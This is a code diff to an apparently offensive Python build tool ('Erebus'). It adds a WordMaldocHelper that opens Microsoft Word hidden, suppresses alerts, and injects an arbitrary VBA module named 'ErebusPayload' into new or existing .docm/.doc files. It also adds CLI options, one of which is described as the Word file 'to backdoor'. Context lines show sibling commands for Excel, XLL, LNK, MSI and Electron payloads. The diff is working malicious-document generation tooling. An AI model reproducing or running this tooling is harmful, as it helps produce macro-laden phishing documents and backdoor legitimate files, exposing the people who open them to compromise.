@@ -1130,6 +1130,195 @@ class ExcelMaldocHelper:
         )
 
 
+# ============================================================================
+# WordMaldocHelper - VBA injection into DOCM/DOC via Word COM automation
+# ============================================================================
+
+# Word file format constants (WdSaveFormat enum)
+_WD_FORMAT_DOCM = 13   # wdFormatXMLDocumentMacroEnabled (.docm)
+_WD_FORMAT_DOC  = 0    # wdFormatDocument                (.doc)
+
+
+def _get_word_app():
+    """Create a hidden Word application COM object."""
+    if not _com_available():
+        raise RuntimeError("pywin32 not found.  Install with: pip install pywin32")
+
+    import win32com.client
+    try:
+        word = win32com.client.Dispatch("Word.Application")
+    except Exception as exc:
+        raise RuntimeError(f"Failed to start Word via COM: {exc}") from exc
+
+    word.Visible = False
+    word.DisplayAlerts = 0   # wdAlertsNone
+    return word
+
+
+def _inject_word_via_com(
+    vba_code: str,
+    output_path: str,
+    source_word: Optional[str],
+    fmt: str,
+    module_name: str = "ErebusPayload",
+    template_path: Optional[str] = None,
+) -> Tuple[bool, str]:
+    """Inject VBA into a Word document (.docm or .doc) via COM automation."""
+    wd_format = _WD_FORMAT_DOC if fmt.lower() == "doc" else _WD_FORMAT_DOCM
+    ext = ".doc" if fmt.lower() == "doc" else ".docm"
+
+    out = Path(output_path).resolve()
+    out.parent.mkdir(parents=True, exist_ok=True)
+    if out.suffix.lower() != ext:
+        out = out.with_suffix(ext)
+        logger.info(f"Adjusted output extension to {ext}: {out.name}")
+
+    word = None
+    doc = None
+    try:
+        word = _get_word_app()
+
+        if source_word:
+            src = Path(source_word).resolve()
+            if not src.exists():
+                return False, f"Source Word file not found: {source_word}"
+            doc = word.Documents.Open(str(src))
+            logger.info(f"Opened source document: {src.name}")
+        else:
+            if template_path and Path(template_path).exists():
+                doc = word.Documents.Open(str(Path(template_path).resolve()))
+                logger.info(f"Opened template: {Path(template_path).name}")
+            else:
+                doc = word.Documents.Add()
+                logger.info("Created new blank document")
+
+        try:
+            vba_project = doc.VBProject
+        except Exception as exc:
+            return False, (
+                f"Cannot access VBA project: {exc}.  "
+                "Ensure 'Trust access to the VBA project object model' is enabled "
+                "in Word > Options > Trust Center > Macro Settings."
+            )
+
+        components = vba_project.VBComponents
+
+        # Remove existing module with same name
+        for comp in components:
+            if comp.Name == module_name:
+                try:
+                    components.Remove(comp)
+                    logger.info(f"Removed existing module '{module_name}'")
+                except Exception:
+                    pass
+                break
+
+        new_mod = components.Add(1)   # vbext_ct_StdModule
+        new_mod.Name = module_name
+        new_mod.CodeModule.AddFromString(vba_code)
+        logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")
+
+        # Save to temp then move (SaveAs fails on existing destination)
+        tmp_fd, tmp_path_str = tempfile.mkstemp(suffix=ext)
+        os.close(tmp_fd)
+        tmp_path = Path(tmp_path_str)
+
+        try:
+            doc.SaveAs2(str(tmp_path), FileFormat=wd_format)
+            logger.info(f"Saved document to temp: {tmp_path.name}")
+        except Exception as save_exc:
+            tmp_path.unlink(missing_ok=True)
+            raise save_exc
+
+        doc.Close(SaveChanges=False)
+        doc = None
+        word.Quit()
+        word = None
+
+        if out.exists():
+            out.unlink()
+        shutil.move(str(tmp_path), str(out))
+
+        if not out.exists():
+            return False, "Word saved cleanly but output file not found on disk"
+
+        size = out.stat().st_size
+        logger.info(f"Output: {out}  ({size:,} bytes)")
+        return True, str(out)
+
+    except Exception as exc:
+        logger.error(f"Word COM injection failed: {exc}")
+        return False, str(exc)
+    finally:
+        try:
+            if doc is not None:
+                doc.Close(SaveChanges=False)
+        except Exception:
+            pass
+        try:
+            if word is not None:
+                word.Quit()
+        except Exception:
+            pass
+
+
+class WordMaldocHelper:
+    """High-level helper for DOCM / DOC maldoc creation via COM automation."""
+
+    def __init__(self, prefer_com: bool = True):
+        self._use_com = prefer_com and _com_available()
+        if not self._use_com:
+            logger.warning(
+                "pywin32 / Word not available.  "
+                "Word COM injection requires a Windows host with pywin32 and Microsoft Word installed."
+            )
+
+    def inject_vba(
+        self,
+        vba_code: str,
+        output_path: str,
+        source_word: Optional[str] = None,
+        fmt: str = "docm",
+        module_name: str = "ErebusPayload",
+        template_path: Optional[str] = None,
+    ) -> Tuple[bool, str]:
+        if not self._use_com:
+            return False, "Word COM injection requires Windows + pywin32 + Microsoft Word"
+        return _inject_word_via_com(
+            vba_code=vba_code,
+            output_path=output_path,
+            source_word=source_word,
+            fmt=fmt,
+            module_name=module_name,
+            template_path=template_path,
+        )
+
+    def from_bas_file(
+        self,
+        bas_path: str,
+        output_path: str,
+        source_word: Optional[str] = None,
+        fmt: str = "docm",
+        module_name: str = "ErebusPayload",
+        template_path: Optional[str] = None,
+    ) -> Tuple[bool, str]:
+        bas = Path(bas_path)
+        if not bas.exists():
+            return False, f"VBA .bas file not found: {bas_path}"
+        try:
+            vba_code = bas.read_text(encoding="utf-8")
+        except Exception as exc:
+            return False, f"Could not read .bas file: {exc}"
+        return self.inject_vba(
+            vba_code=vba_code,
+            output_path=output_path,
+            source_word=source_word,
+            fmt=fmt,
+            module_name=module_name,
+            template_path=template_path,
+        )
+
+
 def main():
     """Command-line interface for Windows build helper."""
     parser = argparse.ArgumentParser(
@@ -1139,8 +1328,8 @@ def main():
 
     parser.add_argument(
         'command',
-        choices=['xll', 'dll', 'verify', 'excel', 'xlsx', 'xlsm', 'xlam', 'lnk', 'msi', 'electron'],
-        help='Build/create command to execute (xll/dll/verify for compilation, excel/xlsx/xlsm/xlam/lnk/msi for creation)'
+        choices=['xll', 'dll', 'verify', 'excel', 'xlsx', 'xlsm', 'xlam', 'docm', 'doc', 'lnk', 'msi', 'electron'],
+        help='Build/create command to execute (xll/dll/verify for compilation, excel/xlsx/xlsm/xlam/docm/doc/lnk/msi for creation)'
     )
 
     # Common arguments
@@ -1203,6 +1392,16 @@ def main():
         choices=['xlsx', 'xlsm', 'xls', 'xlam'],
         default='xlsm',
         help='Excel format for output (default: xlsm)'
+    )
+
+    parser.add_argument(
+        '--source-word',
+        help='Existing Word file to backdoor (docm/doc). Creates a new document if omitted.'
+    )
+
+    parser.add_argument(
+        '--word-template',
+        help='Path to template.docm or template.doc for new document creation. Auto-resolved if omitted.'
     )
 
     parser.add_argument(
@@ -1361,6 +1560,9 @@ def main():
     elif args.command in ('xlsx', 'xlsm', 'xlam'):
         if not args.bas_file:
             parser.error(f"--bas-file is required for {args.command} command")
+    elif args.command in ('docm', 'doc'):
+        if not args.bas_file:
+            parser.error(f"--bas-file is required for {args.command} command")
     elif args.command == 'lnk':
         # For lnk: --target-binary is the target, other args are optional
         if not args.target_binary:
@@ -1458,6 +1660,24 @@ def main():
                 success = ok
             except Exception as e:
                 logger.error(f"Maldoc creation failed: {e}")
+                success = False
+
+        elif args.command in ('docm', 'doc'):
+            try:
+                helper = WordMaldocHelper(prefer_com=not args.no_com)
+                ok, msg = helper.from_bas_file(
+                    bas_path=args.bas_file,
+                    output_path=args.output,
+                    source_word=getattr(args, 'source_word', None),
+                    fmt=args.command,
+                    module_name=args.module_name,
+                    template_path=getattr(args, 'word_template', None),
+                )
+                if not ok:
+                    logger.error(f"Word maldoc injection failed: {msg}")
+                success = ok
+            except Exception as e:
+                logger.error(f"Word maldoc creation failed: {e}")
                 success = False
 
         elif args.command == 'lnk':
